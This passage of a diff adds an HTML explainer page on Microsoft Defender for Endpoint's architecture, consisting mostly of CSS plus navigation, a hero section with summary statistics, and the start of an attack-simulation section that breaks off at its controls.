@@ -1,0 +1,1936 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft Defender for Endpoint — Architecture Deep Dive</title>
+<style>
+/* ========== RESET & BASE ========== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0e1a;--bg2:#111827;--bg3:#1a2236;
+  --cyan:#00e5ff;--cyan-dim:rgba(0,229,255,.15);
+  --blue:#3b82f6;--purple:#a855f7;--green:#22c55e;--red:#ef4444;
+  --orange:#f97316;--yellow:#eab308;--pink:#ec4899;
+  --text:#e2e8f0;--text-dim:#94a3b8;
+  --glass:rgba(255,255,255,.04);
+  --border:rgba(255,255,255,.08);
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,-apple-system,sans-serif;line-height:1.6;overflow-x:hidden}
+
+/* ========== SCROLLBAR ========== */
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--cyan-dim);border-radius:3px}
+
+/* ========== NAVIGATION ========== */
+nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(10,14,26,.92);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:0 2rem}
+nav .nav-inner{max-width:1400px;margin:0 auto;display:flex;align-items:center;gap:2rem;height:60px}
+nav .logo{font-size:1.1rem;font-weight:700;color:var(--cyan);white-space:nowrap;display:flex;align-items:center;gap:.5rem}
+nav .logo .shield{font-size:1.4rem}
+nav .nav-links{display:flex;gap:.25rem;overflow-x:auto;flex:1}
+nav .nav-links a{color:var(--text-dim);text-decoration:none;font-size:.78rem;padding:.4rem .7rem;border-radius:6px;white-space:nowrap;transition:all .2s}
+nav .nav-links a:hover,nav .nav-links a.active{color:var(--cyan);background:var(--cyan-dim)}
+
+/* ========== HERO ========== */
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:8rem 2rem 4rem;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:-200px;left:50%;transform:translateX(-50%);width:800px;height:800px;background:radial-gradient(circle,rgba(0,229,255,.08) 0%,transparent 70%);pointer-events:none}
+.hero h1{font-size:clamp(2rem,5vw,3.5rem);font-weight:800;line-height:1.15;margin-bottom:1rem}
+.hero h1 .accent{background:linear-gradient(135deg,var(--cyan),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{font-size:1.15rem;color:var(--text-dim);max-width:700px;margin-bottom:2rem}
+.hero .badge{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:99px;background:var(--glass);border:1px solid var(--border);font-size:.85rem;color:var(--text-dim);margin-bottom:1.5rem}
+.hero .badge .dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse-dot 2s infinite}
+@keyframes pulse-dot{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(34,197,94,.4)}50%{opacity:.7;box-shadow:0 0 0 8px rgba(34,197,94,0)}}
+
+/* ========== SECTIONS ========== */
+section{padding:5rem 2rem;position:relative;z-index:1}
+.section-inner{max-width:1300px;margin:0 auto}
+.section-label{display:inline-flex;align-items:center;gap:.5rem;padding:.35rem .85rem;border-radius:99px;font-size:.75rem;font-weight:600;text-transform:uppercase;letter-spacing:.08em;margin-bottom:1rem}
+.section-title{font-size:clamp(1.6rem,3.5vw,2.4rem);font-weight:700;margin-bottom:.75rem}
+.section-desc{font-size:1rem;color:var(--text-dim);max-width:700px;margin-bottom:3rem}
+
+/* ========== ANIMATED GRID BG ========== */
+.grid-bg{position:absolute;inset:0;overflow:hidden;pointer-events:none;opacity:.3}
+.grid-bg::before{content:'';position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:60px 60px}
+
+/* ========== COMPONENT CARDS ========== */
+.card{background:var(--glass);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all .3s;position:relative;overflow:hidden}
+.card:hover{border-color:rgba(0,229,255,.3);transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,229,255,.08)}
+.card .card-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;margin-bottom:1rem;flex-shrink:0}
+.card h3{font-size:1.05rem;font-weight:600;margin-bottom:.5rem}
+.card p{font-size:.88rem;color:var(--text-dim);line-height:1.55}
+.card .tag{display:inline-block;padding:.15rem .5rem;border-radius:4px;font-size:.7rem;font-weight:600;margin-top:.5rem;margin-right:.25rem}
+
+/* ========== SECTION 1: SENSOR LAYER ========== */
+#sensor{background:linear-gradient(180deg,var(--bg) 0%,var(--bg2) 100%)}
+.sensor-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.25rem}
+.sensor-card .card-icon{background:rgba(0,229,255,.1);color:var(--cyan)}
+.sensor-card .tag{background:rgba(0,229,255,.1);color:var(--cyan)}
+
+/* ========== SECTION 2: DETECTION ENGINES ========== */
+#engines{background:var(--bg2)}
+.engines-container{display:grid;grid-template-columns:1fr 1fr;gap:2rem}
+.engine-col h3{font-size:1.15rem;font-weight:700;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
+.engine-col .engine-card{margin-bottom:1rem}
+.client-engine .card-icon{background:rgba(168,85,247,.1);color:var(--purple)}
+.cloud-engine .card-icon{background:rgba(59,130,246,.1);color:var(--blue)}
+.client-engine .tag{background:rgba(168,85,247,.1);color:var(--purple)}
+.cloud-engine .tag{background:rgba(59,130,246,.1);color:var(--blue)}
+@media(max-width:768px){.engines-container{grid-template-columns:1fr}}
+
+/* ========== SECTION 3: DATA FLOW ========== */
+#dataflow{background:linear-gradient(180deg,var(--bg2) 0%,var(--bg) 100%)}
+.flow-pipeline{position:relative;display:flex;flex-direction:column;gap:0;align-items:center}
+.flow-stage{display:flex;align-items:center;gap:1.5rem;width:100%;max-width:1000px;padding:1.5rem;position:relative}
+.flow-stage .stage-num{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2rem;font-weight:800;flex-shrink:0;position:relative;z-index:2}
+.flow-stage .stage-content{flex:1}
+.flow-stage .stage-content h3{font-size:1.05rem;font-weight:600;margin-bottom:.25rem}
+.flow-stage .stage-content p{font-size:.88rem;color:var(--text-dim)}
+.flow-connector{width:3px;height:50px;position:relative;z-index:1}
+.flow-connector .connector-line{width:100%;height:100%;position:relative;overflow:hidden}
+.flow-connector .connector-line::before{content:'';position:absolute;width:100%;height:100%;background:linear-gradient(180deg,transparent,var(--cyan),transparent)}
+.flow-connector .particle{position:absolute;width:3px;height:12px;background:var(--cyan);border-radius:2px;animation:flow-down 1.5s infinite;box-shadow:0 0 8px var(--cyan)}
+@keyframes flow-down{0%{top:-12px;opacity:0}20%{opacity:1}80%{opacity:1}100%{top:100%;opacity:0}}
+.stage-collect .stage-num{background:rgba(0,229,255,.15);color:var(--cyan);border:2px solid rgba(0,229,255,.3)}
+.stage-transmit .stage-num{background:rgba(59,130,246,.15);color:var(--blue);border:2px solid rgba(59,130,246,.3)}
+.stage-process .stage-num{background:rgba(168,85,247,.15);color:var(--purple);border:2px solid rgba(168,85,247,.3)}
+.stage-detect .stage-num{background:rgba(249,115,22,.15);color:var(--orange);border:2px solid rgba(249,115,22,.3)}
+.stage-respond .stage-num{background:rgba(239,68,68,.15);color:var(--red);border:2px solid rgba(239,68,68,.3)}
+.stage-store .stage-num{background:rgba(34,197,94,.15);color:var(--green);border:2px solid rgba(34,197,94,.3)}
+
+/* ========== SECTION 4: ATTACK KILL CHAIN ANIMATION ========== */
+#killchain{background:var(--bg)}
+.killchain-timeline{position:relative;max-width:900px;margin:0 auto}
+.kc-phase{display:flex;gap:1.5rem;margin-bottom:0;padding:1.5rem;position:relative;opacity:.4;transform:translateX(-20px);transition:all .6s}
+.kc-phase.active{opacity:1;transform:translateX(0)}
+.kc-phase .phase-marker{flex-shrink:0;width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;position:relative;z-index:2}
+.kc-phase .phase-body{flex:1}
+.kc-phase .phase-body h3{font-size:1rem;font-weight:600;margin-bottom:.15rem}
+.kc-phase .phase-body .mitre{font-size:.75rem;font-weight:600;margin-bottom:.35rem;display:inline-block;padding:.1rem .45rem;border-radius:4px}
+.kc-phase .phase-body p{font-size:.85rem;color:var(--text-dim)}
+.kc-phase .phase-body .detection{margin-top:.5rem;padding:.5rem .75rem;border-radius:8px;font-size:.8rem;display:flex;align-items:center;gap:.5rem}
+.kc-connector-v{width:3px;height:30px;margin-left:22.5px;position:relative;overflow:hidden}
+.kc-connector-v .kc-particle{position:absolute;width:3px;height:10px;border-radius:2px;animation:flow-down 1.2s infinite}
+
+/* Kill chain phase colors */
+.kc-initial .phase-marker{background:rgba(59,130,246,.15);color:var(--blue);border:2px solid rgba(59,130,246,.3)}
+.kc-initial .mitre{background:rgba(59,130,246,.15);color:var(--blue)}
+.kc-persist .phase-marker{background:rgba(168,85,247,.15);color:var(--purple);border:2px solid rgba(168,85,247,.3)}
+.kc-persist .mitre{background:rgba(168,85,247,.15);color:var(--purple)}
+.kc-discovery .phase-marker{background:rgba(234,179,8,.15);color:var(--yellow);border:2px solid rgba(234,179,8,.3)}
+.kc-discovery .mitre{background:rgba(234,179,8,.15);color:var(--yellow)}
+.kc-credential .phase-marker{background:rgba(249,115,22,.15);color:var(--orange);border:2px solid rgba(249,115,22,.3)}
+.kc-credential .mitre{background:rgba(249,115,22,.15);color:var(--orange)}
+.kc-lateral .phase-marker{background:rgba(236,72,153,.15);color:var(--pink);border:2px solid rgba(236,72,153,.3)}
+.kc-lateral .mitre{background:rgba(236,72,153,.15);color:var(--pink)}
+.kc-exfil .phase-marker{background:rgba(239,68,68,.15);color:var(--red);border:2px solid rgba(239,68,68,.3)}
+.kc-exfil .mitre{background:rgba(239,68,68,.15);color:var(--red)}
+.kc-air .phase-marker{background:rgba(34,197,94,.15);color:var(--green);border:2px solid rgba(34,197,94,.3)}
+.kc-air .mitre{background:rgba(34,197,94,.15);color:var(--green)}
+.kc-phase .detection{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:var(--green)}
+.kc-connector-v .kc-particle{background:var(--red);box-shadow:0 0 6px var(--red)}
+
+/* ========== SECTION 5: AIR ========== */
+#air{background:var(--bg2)}
+.air-flow{display:flex;gap:0;align-items:flex-start;justify-content:center;flex-wrap:wrap}
+.air-step{flex:1;min-width:160px;max-width:220px;text-align:center;padding:1.25rem .75rem;position:relative}
+.air-step .air-icon{width:56px;height:56px;border-radius:50%;margin:0 auto 1rem;display:flex;align-items:center;justify-content:center;font-size:1.5rem}
+.air-step h4{font-size:.9rem;font-weight:600;margin-bottom:.25rem}
+.air-step p{font-size:.78rem;color:var(--text-dim)}
+.air-arrow{display:flex;align-items:center;padding-top:1.5rem;color:var(--cyan);font-size:1.2rem;animation:arrow-pulse 1.5s infinite}
+@keyframes arrow-pulse{0%,100%{opacity:.3;transform:translateX(0)}50%{opacity:1;transform:translateX(4px)}}
+@media(max-width:768px){.air-flow{flex-direction:column;align-items:center}.air-arrow{transform:rotate(90deg);padding:0}}
+
+/* ========== SECTION 6: ADVANCED HUNTING ========== */
+#hunting{background:linear-gradient(180deg,var(--bg2) 0%,var(--bg) 100%)}
+.tables-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem;margin-bottom:2rem}
+.table-card{background:var(--glass);border:1px solid var(--border);border-radius:12px;padding:1.15rem;transition:all .3s}
+.table-card:hover{border-color:rgba(0,229,255,.25)}
+.table-card .table-name{font-family:'Cascadia Code','Fira Code',monospace;font-size:.88rem;color:var(--cyan);margin-bottom:.35rem;display:flex;align-items:center;gap:.5rem}
+.table-card .table-name .tbl-icon{font-size:.75rem}
+.table-card .table-desc{font-size:.8rem;color:var(--text-dim)}
+
+/* ========== SECTION 7: TVM ========== */
+#tvm{background:var(--bg)}
+.tvm-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.25rem}
+.tvm-card .card-icon{background:rgba(34,197,94,.1);color:var(--green)}
+.tvm-card .tag{background:rgba(34,197,94,.1);color:var(--green)}
+
+/* ========== SECTION 8: INTEGRATIONS ========== */
+#integrations{background:var(--bg2)}
+.integrations-orbit{position:relative;width:500px;height:500px;margin:0 auto}
+.orbit-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;border-radius:50%;background:linear-gradient(135deg,rgba(0,229,255,.15),rgba(59,130,246,.15));border:2px solid rgba(0,229,255,.3);display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;z-index:3;font-size:.75rem;font-weight:700;color:var(--cyan)}
+.orbit-center .orbit-icon{font-size:2rem;margin-bottom:.25rem}
+.orbit-ring{position:absolute;top:50%;left:50%;border:1px dashed var(--border);border-radius:50%;animation:orbit-spin 60s linear infinite}
+.orbit-ring-1{width:300px;height:300px;margin:-150px 0 0 -150px}
+.orbit-ring-2{width:440px;height:440px;margin:-220px 0 0 -220px;animation-duration:90s;animation-direction:reverse}
+.orbit-item{position:absolute;width:80px;height:80px;border-radius:12px;background:var(--glass);border:1px solid var(--border);display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-size:.65rem;font-weight:600;color:var(--text);transition:all .3s;cursor:default}
+.orbit-item:hover{border-color:rgba(0,229,255,.4);transform:scale(1.1);z-index:5}
+.orbit-item .oi-icon{font-size:1.3rem;margin-bottom:.2rem}
+@media(max-width:600px){.integrations-orbit{width:100%;height:auto;display:grid;grid-template-columns:repeat(2,1fr);gap:1rem}.orbit-center{position:static;transform:none;width:auto;height:auto;border-radius:12px;grid-column:1/-1;padding:1rem}.orbit-ring{display:none}.orbit-item{position:static;width:auto;height:auto;padding:.75rem}}
+
+/* ========== DATA STATS BAR ========== */
+.stats-bar{display:flex;justify-content:center;gap:3rem;flex-wrap:wrap;margin:2rem 0}
+.stat{text-align:center}
+.stat .stat-value{font-size:2rem;font-weight:800;background:linear-gradient(135deg,var(--cyan),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stat .stat-label{font-size:.78rem;color:var(--text-dim);margin-top:.15rem}
+
+/* ========== ANIMATED PARTICLES CANVAS ========== */
+#particles-canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:.4}
+
+/* ========== FOOTER ========== */
+footer{text-align:center;padding:3rem 2rem;border-top:1px solid var(--border);font-size:.8rem;color:var(--text-dim)}
+footer a{color:var(--cyan);text-decoration:none}
+
+/* ========== ANIMATIONS ========== */
+@keyframes orbit-spin{from{transform:translate(-50%,-50%) rotate(0deg)}to{transform:translate(-50%,-50%) rotate(360deg)}}
+@keyframes fade-up{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.fade-in{opacity:0;transform:translateY(30px);transition:opacity .6s,transform .6s}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+
+/* ========== LIVE TELEMETRY TICKER ========== */
+.ticker-bar{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.1);border-radius:12px;padding:.75rem 1.25rem;margin-bottom:2rem;overflow:hidden;position:relative}
+.ticker-bar .ticker-label{font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:var(--cyan);margin-bottom:.35rem}
+.ticker-content{font-family:'Cascadia Code','Fira Code',monospace;font-size:.8rem;color:var(--text-dim);white-space:nowrap;animation:ticker-scroll 30s linear infinite}
+@keyframes ticker-scroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+
+/* ========== EXPANDABLE DETAIL ========== */
+.expandable{cursor:pointer}
+.expandable .expand-content{max-height:0;overflow:hidden;transition:max-height .4s ease}
+.expandable.open .expand-content{max-height:500px}
+.expandable .expand-toggle{font-size:.75rem;color:var(--cyan);margin-top:.5rem;display:flex;align-items:center;gap:.25rem}
+.expandable .expand-toggle::after{content:'▼';font-size:.6rem;transition:transform .3s}
+.expandable.open .expand-toggle::after{transform:rotate(180deg)}
+.expand-content .detail-list{padding:.75rem 0 0 0;font-size:.82rem;color:var(--text-dim)}
+.expand-content .detail-list li{margin-bottom:.35rem;list-style:none;padding-left:1rem;position:relative}
+.expand-content .detail-list li::before{content:'›';position:absolute;left:0;color:var(--cyan);font-weight:700}
+/* ========== SIMULATION THEATER ========== */
+#simulation{background:linear-gradient(180deg,var(--bg) 0%,#0d1321 100%);padding:5rem 2rem 4rem;min-height:100vh}
+.sim-theater{max-width:1200px;margin:0 auto;position:relative}
+.sim-controls{display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem;flex-wrap:wrap}
+.sim-btn{padding:.5rem 1.25rem;border-radius:8px;border:1px solid var(--border);background:var(--glass);color:var(--text);font-size:.85rem;font-weight:600;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:.4rem}
+.sim-btn:hover{border-color:var(--cyan);color:var(--cyan)}
+.sim-btn.active{background:rgba(0,229,255,.15);border-color:var(--cyan);color:var(--cyan)}
+.sim-progress{flex:1;min-width:200px;height:6px;background:rgba(255,255,255,.06);border-radius:3px;overflow:hidden}
+.sim-progress-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--cyan),var(--blue));border-radius:3px;transition:width .5s ease}
+.sim-step-label{font-size:.8rem;color:var(--cyan);font-weight:600;min-width:180px;text-align:right}
+
+/* Simulation grid layout */
+.sim-grid{display:grid;grid-template-columns:280px 1fr 280px;grid-template-rows:auto auto;gap:1.25rem;min-height:600px}
+@media(max-width:1000px){.sim-grid{grid-template-columns:1fr;grid-template-rows:auto}}
+
+/* Panels */
+.sim-panel{background:rgba(255,255,255,.02);border:1px solid var(--border);border-radius:16px;padding:1.25rem;position:relative;overflow:hidden;transition:border-color .5s,box-shadow .5s}
+.sim-panel.highlight{border-color:rgba(0,229,255,.5);box-shadow:0 0 30px rgba(0,229,255,.08)}
+.sim-panel.alert-highlight{border-color:rgba(239,68,68,.5);box-shadow:0 0 30px rgba(239,68,68,.1)}
+.sim-panel.green-highlight{border-color:rgba(34,197,94,.5);box-shadow:0 0 30px rgba(34,197,94,.1)}
+.sim-panel-title{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
+.sim-panel-title .panel-dot{width:8px;height:8px;border-radius:50%;animation:pulse-dot 2s infinite}
+
+/* Attacker panel */
+.panel-attacker{grid-column:1;grid-row:1/3}
+.panel-attacker .sim-panel-title{color:var(--red)}
+.panel-attacker .panel-dot{background:var(--red)}
+
+/* Center main view */
+.panel-endpoint{grid-column:2;grid-row:1}
+.panel-endpoint .sim-panel-title{color:var(--cyan)}
+.panel-endpoint .panel-dot{background:var(--cyan)}
+
+/* Cloud panel */
+.panel-cloud{grid-column:3;grid-row:1/3}
+.panel-cloud .sim-panel-title{color:var(--blue)}
+.panel-cloud .panel-dot{background:var(--blue)}
+
+/* SOC panel */
+.panel-soc{grid-column:2;grid-row:2}
+.panel-soc .sim-panel-title{color:var(--green)}
+.panel-soc .panel-dot{background:var(--green)}
+
+/* Log lines */
+.sim-log{font-family:'Cascadia Code','Fira Code',monospace;font-size:.72rem;line-height:1.7;max-height:460px;overflow-y:auto;scrollbar-width:thin}
+.sim-log .log-entry{padding:.3rem .5rem;border-radius:4px;margin-bottom:2px;opacity:0;transform:translateY(8px);transition:opacity .4s,transform .4s;display:flex;align-items:flex-start;gap:.5rem}
+.sim-log .log-entry.visible{opacity:1;transform:translateY(0)}
+.log-time{color:var(--text-dim);flex-shrink:0;min-width:55px}
+.log-icon{flex-shrink:0;font-size:.8rem}
+.log-msg{flex:1;word-break:break-word}
+.log-entry.log-red{background:rgba(239,68,68,.06);color:var(--red)}
+.log-entry.log-cyan{background:rgba(0,229,255,.06);color:var(--cyan)}
+.log-entry.log-blue{background:rgba(59,130,246,.06);color:var(--blue)}
+.log-entry.log-green{background:rgba(34,197,94,.06);color:var(--green)}
+.log-entry.log-orange{background:rgba(249,115,22,.06);color:var(--orange)}
+.log-entry.log-yellow{background:rgba(234,179,8,.06);color:var(--yellow)}
+.log-entry.log-purple{background:rgba(168,85,247,.06);color:var(--purple)}
+.log-entry.log-dim{background:transparent;color:var(--text-dim)}
+
+/* Center visual */
+.sim-visual{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;padding:1rem}
+.sim-device{width:180px;height:130px;border:2px solid var(--border);border-radius:12px;background:rgba(255,255,255,.02);display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;transition:all .5s}
+.sim-device.infected{border-color:var(--red);box-shadow:0 0 40px rgba(239,68,68,.15)}
+.sim-device.scanning{border-color:var(--yellow);box-shadow:0 0 40px rgba(234,179,8,.15);animation:scan-pulse 1s infinite}
+.sim-device.isolated{border-color:var(--orange);box-shadow:0 0 40px rgba(249,115,22,.15)}
+.sim-device.clean{border-color:var(--green);box-shadow:0 0 40px rgba(34,197,94,.15)}
+@keyframes scan-pulse{0%,100%{opacity:1}50%{opacity:.7}}
+.sim-device .device-icon{font-size:2.5rem;margin-bottom:.25rem}
+.sim-device .device-label{font-size:.7rem;font-weight:600;color:var(--text-dim)}
+.sim-device .device-status{font-size:.65rem;font-weight:700;margin-top:.25rem;padding:.15rem .5rem;border-radius:4px}
+
+/* Data flow arrows in center */
+.sim-arrows{display:flex;justify-content:space-between;width:100%;margin:1rem 0;position:relative}
+.sim-arrow-left,.sim-arrow-right{display:flex;align-items:center;gap:.25rem;font-size:.7rem;font-weight:600;opacity:0;transition:opacity .4s}
+.sim-arrow-left.visible,.sim-arrow-right.visible{opacity:1}
+.sim-arrow-left{color:var(--red)}
+.sim-arrow-right{color:var(--blue)}
+.arrow-particles{display:flex;gap:3px}
+.arrow-particle{width:4px;height:4px;border-radius:50%;animation:arrow-flow 1s infinite}
+.sim-arrow-left .arrow-particle{background:var(--red)}
+.sim-arrow-right .arrow-particle{background:var(--cyan)}
+@keyframes arrow-flow{0%{opacity:.2;transform:translateX(0)}50%{opacity:1}100%{opacity:.2;transform:translateX(8px)}}
+.arrow-particle:nth-child(2){animation-delay:.2s}
+.arrow-particle:nth-child(3){animation-delay:.4s}
+
+/* Narrative box */
+.sim-narrative{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.15);border-radius:12px;padding:1rem 1.25rem;margin-top:1.5rem;text-align:center;min-height:80px;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:all .5s}
+.sim-narrative .narr-step{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--cyan);margin-bottom:.25rem}
+.sim-narrative .narr-text{font-size:.92rem;color:var(--text)}
+.sim-narrative.narr-red{background:rgba(239,68,68,.04);border-color:rgba(239,68,68,.2)}
+.sim-narrative.narr-red .narr-step{color:var(--red)}
+.sim-narrative.narr-green{background:rgba(34,197,94,.04);border-color:rgba(34,197,94,.2)}
+.sim-narrative.narr-green .narr-step{color:var(--green)}
+
+/* ========== WHY THIS MATTERS BOXES ========== */
+.why-box{background:linear-gradient(135deg,rgba(249,115,22,.04),rgba(234,179,8,.04));border:1px solid rgba(249,115,22,.2);border-radius:14px;padding:1.5rem;margin-top:2.5rem;position:relative;z-index:1;overflow:hidden}
+.why-box.fade-in{opacity:1;transform:translateY(0)}
+.why-box::before{content:'💡';position:absolute;top:-8px;right:16px;font-size:2.5rem;opacity:.15}
+.why-box .why-title{font-size:.85rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--orange);margin-bottom:.75rem;display:flex;align-items:center;gap:.5rem}
+.why-box .why-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+@media(max-width:768px){.why-box .why-grid{grid-template-columns:1fr}}
+.why-item{display:flex;gap:.6rem;align-items:flex-start}
+.why-item .why-icon{font-size:1.1rem;flex-shrink:0;margin-top:2px}
+.why-item .why-content h4{font-size:.85rem;font-weight:600;color:var(--text);margin-bottom:.15rem}
+.why-item .why-content p{font-size:.78rem;color:var(--text-dim);line-height:1.5}
+
+/* Simulation speed/pause controls */
+.sim-btn.paused{background:rgba(234,179,8,.15);border-color:var(--yellow);color:var(--yellow)}
+.sim-speed-controls{display:flex;align-items:center;gap:.5rem;margin-left:.5rem}
+.sim-speed-controls label{font-size:.72rem;color:var(--text-dim);font-weight:600}
+.speed-btn{padding:.25rem .5rem;border-radius:4px;border:1px solid var(--border);background:var(--glass);color:var(--text-dim);font-size:.72rem;cursor:pointer;transition:all .2s}
+.speed-btn:hover,.speed-btn.active{border-color:var(--cyan);color:var(--cyan);background:var(--cyan-dim)}
+/* ========== CHATBOX ========== */
+.chat-toggle{position:fixed;bottom:24px;right:24px;width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,var(--cyan),var(--blue));border:none;color:white;font-size:1.5rem;cursor:pointer;z-index:200;box-shadow:0 4px 20px rgba(0,229,255,.3);transition:all .2s;display:flex;align-items:center;justify-content:center}
+.chat-toggle:hover{transform:scale(1.1);box-shadow:0 6px 30px rgba(0,229,255,.4)}
+.chat-toggle.open{border-radius:12px;width:44px;height:44px;font-size:1.1rem;bottom:470px;right:24px}
+.chat-panel{position:fixed;bottom:24px;right:24px;width:380px;height:440px;background:var(--bg2);border:1px solid var(--border);border-radius:16px;z-index:199;display:none;flex-direction:column;box-shadow:0 8px 40px rgba(0,0,0,.5);overflow:hidden}
+.chat-panel.open{display:flex}
+.chat-header{padding:.75rem 1rem;background:linear-gradient(135deg,rgba(0,229,255,.1),rgba(59,130,246,.1));border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.5rem}
+.chat-header .ch-icon{font-size:1.2rem}
+.chat-header .ch-title{font-size:.85rem;font-weight:700;color:var(--cyan)}
+.chat-header .ch-sub{font-size:.7rem;color:var(--text-dim);margin-left:auto}
+.chat-messages{flex:1;overflow-y:auto;padding:.75rem;display:flex;flex-direction:column;gap:.5rem;scrollbar-width:thin}
+.chat-msg{max-width:90%;padding:.6rem .85rem;border-radius:12px;font-size:.82rem;line-height:1.5;animation:msg-in .3s ease}
+@keyframes msg-in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.chat-msg.bot{background:rgba(0,229,255,.06);border:1px solid rgba(0,229,255,.12);color:var(--text);align-self:flex-start;border-bottom-left-radius:4px}
+.chat-msg.user{background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.2);color:var(--text-bright);align-self:flex-end;border-bottom-right-radius:4px}
+.chat-msg .term-name{color:var(--cyan);font-weight:700;display:block;margin-bottom:.25rem}
+.chat-msg .term-category{font-size:.65rem;color:var(--text-dim);background:var(--glass);padding:.1rem .35rem;border-radius:3px;display:inline-block;margin-bottom:.35rem}
+.chat-input-row{padding:.5rem;border-top:1px solid var(--border);display:flex;gap:.35rem}
+.chat-input{flex:1;height:36px;border:1px solid var(--border);border-radius:8px;background:var(--bg);color:var(--text);padding:0 .75rem;font-size:.82rem;font-family:inherit}
+.chat-input:focus{outline:none;border-color:var(--cyan)}
+.chat-input::placeholder{color:var(--text-dim)}
+.chat-send{width:36px;height:36px;border-radius:8px;border:1px solid var(--cyan);background:rgba(0,229,255,.1);color:var(--cyan);font-size:.9rem;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center}
+.chat-send:hover{background:rgba(0,229,255,.2)}
+.chat-suggestions{padding:.35rem .75rem;display:flex;gap:.35rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+.chat-sug{padding:.2rem .5rem;border-radius:99px;border:1px solid var(--border);font-size:.68rem;color:var(--text-dim);cursor:pointer;transition:all .15s;background:none}
+.chat-sug:hover{border-color:var(--cyan);color:var(--cyan)}
+</style>
+</head>
+<body>
+
+<canvas id="particles-canvas"></canvas>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-inner">
+    <div class="logo"><span class="shield">🛡️</span> MDE Architecture</div>
+    <div class="nav-links">
+      <a href="#simulation">▶ Live Sim</a>
+      <a href="#sensor">Sensor</a>
+      <a href="#mdav">MDAV</a>
+      <a href="#asr">ASR</a>
+      <a href="#engines">Engines</a>
+      <a href="#dataflow">Data Flow</a>
+      <a href="#killchain">Kill Chain</a>
+      <a href="#air">AIR</a>
+      <a href="#hunting">Hunting</a>
+      <a href="#tvm">TVM</a>
+      <a href="#integrations">Integrations</a>
+    </div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="badge"><span class="dot"></span> Validated against Microsoft Learn docs — March 2026</div>
+  <h1>How <span class="accent">Microsoft Defender for Endpoint</span> Actually Works</h1>
+  <p>A complete animated walkthrough of MDE's architecture — from kernel-level sensor hooks to cloud ML engines, automated investigation, and threat hunting.</p>
+  <div class="stats-bar">
+    <div class="stat"><div class="stat-value">78T+</div><div class="stat-label">Daily Signals Processed</div></div>
+    <div class="stat"><div class="stat-value">6</div><div class="stat-label">Months Telemetry Stored</div></div>
+    <div class="stat"><div class="stat-value">30</div><div class="stat-label">Days Advanced Hunting</div></div>
+    <div class="stat"><div class="stat-value">5</div><div class="stat-label">OS Platforms Supported</div></div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- MDE IN ACTION: FULL ANIMATED SIMULATION -->
+<!-- ============================================================ -->
+<section id="simulation">
+  <div class="sim-theater">
+    <div class="section-label" style="background:rgba(239,68,68,.15);color:var(--red)">▶ Live Simulation</div>
+    <h2 class="section-title">MDE in Action — Watch an Attack Get Stopped</h2>
+    <p class="section-desc">A full APT attack simulation plays out in real time. Watch the attacker act, the sensor collect, the cloud detect, and the SOC respond — all animated step by step.</p>
+
+    <div class="sim-controls">
